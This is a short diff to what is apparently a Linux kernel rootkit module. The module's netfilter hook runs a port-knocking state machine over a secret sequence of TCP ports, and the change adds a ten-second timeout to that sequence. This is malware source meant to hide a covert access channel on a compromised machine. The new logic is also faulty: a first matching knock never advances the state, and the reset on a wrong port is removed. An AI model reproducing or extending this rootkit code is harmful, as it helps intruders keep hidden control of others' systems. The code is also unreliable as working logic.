@@ -5,6 +5,7 @@
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
 #include <linux/skbuff.h>
+#include <linux/time.h>
 #include <net/icmp.h>
 #include <net/ip.h>
 #include <net/netfilter/ipv4/nf_reject.h>
@@ -19,6 +20,7 @@ static struct nf_hook_ops hook;
 static unsigned int tcp_state = 0;
 static unsigned int udp_state = 0;
 static unsigned short port_order[5] = {12345, 666, 23, 1337, 42};
+static struct timespec time;
 
 /* 
  * This function does all the checking.
@@ -46,12 +48,18 @@ is_port_blocked (struct sk_buff *skb) {
 		/* work the state machine */
 		if(tcp_state < 5) {
 			if(port_order[tcp_state] == port) {
-				tcp_state++;
-			} else if (tcp_state > 0
-					&& port_order[tcp_state-1] == port) {
-				/* do nothing */
-			} else {
-				tcp_state = 0;
+				if(tcp_state == 0) {
+					getnstimeofday(&time);
+				} else {
+					struct timespec cur;
+					getnstimeofday(&cur);
+					
+					if(cur.tv_sec - time.tv_sec > 10) {
+						tcp_state = 0;
+					} else {
+						tcp_state++;
+					}
+				}
 			}
 			
 			ROOTKIT_DEBUG("Packet detected on TCP Port %u. State is now %u.\n", port, tcp_state);
